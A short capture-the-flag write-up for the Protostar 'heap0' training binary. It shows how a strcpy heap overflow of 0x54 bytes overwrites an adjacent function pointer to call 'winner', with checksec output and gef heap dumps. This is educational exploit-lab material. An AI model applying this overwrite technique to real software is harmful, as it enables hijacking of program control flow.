# Protostar - Heap0
Pretty straight forward heap overflow. We have to call the function **winner**.

## Binary
### Code
Decompiled with Binary Ninja HLIL.

![](img/main_hlil.png)

### Security 
Only NX enabled.

```shell
$ checksec ./heap0
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## Solution
Overwrite pointer to **nowinner** with pointer to **winner** function.

#### First heap chunk
```shell
gef➤  heap chunk 0x0804b1a0
Chunk(addr=0x804b1a0, size=0x50, flags=PREV_INUSE)
Chunk size: 80 (0x50)
Usable size: 76 (0x4c)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```

#### Second heap chunk
```shell
gef➤  heap chunk 0x0804b1f0
Chunk(addr=0x804b1f0, size=0x10, flags=PREV_INUSE)
Chunk size: 16 (0x10)
Usable size: 12 (0xc)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```

As we can see from the size of the first heap chunk we need 0x50 bytes of padding before overwritting the function pointer.

#### Second heap chunk before overflow
```shell
gef➤  dereference 0x0804b1f0-8
0x0804b1e8│+0x0000: 0x00000000
0x0804b1ec│+0x0004: 0x00000011
0x0804b1f0│+0x0008: 0x080484e1  →  <nowinner+0> push ebp	 ← $eax
0x0804b1f4│+0x000c: 0x00000000
0x0804b1f8│+0x0010: 0x00000000
0x0804b1fc│+0x0014: 0x00021e09
0x0804b200│+0x0018: 0x00000000
0x0804b204│+0x001c: 0x00000000
0x0804b208│+0x0020: 0x00000000
0x0804b20c│+0x0024: 0x00000000
```

#### Second heap chunk after overflow
After **strcpy** with an argument of length 0x54.
```shell
gef➤  dereference 0x0804b1f0-8
0x0804b1e8│+0x0000: "AAAAAAAAAAAA"
0x0804b1ec│+0x0004: "AAAAAAAA"
0x0804b1f0│+0x0008: "AAAA"
0x0804b1f4│+0x000c: 0x00000000	 ← $edx
0x0804b1f8│+0x0010: 0x00000000
0x0804b1fc│+0x0014: 0x00000411
0x0804b200│+0x0018: "data is at 0x804b1a0, fp is at 0x804b1f0\n"
0x0804b204│+0x001c: "is at 0x804b1a0, fp is at 0x804b1f0\n"
0x0804b208│+0x0020: "at 0x804b1a0, fp is at 0x804b1f0\n"
0x0804b20c│+0x0024: "x804b1a0, fp is at 0x804b1f0\n"
```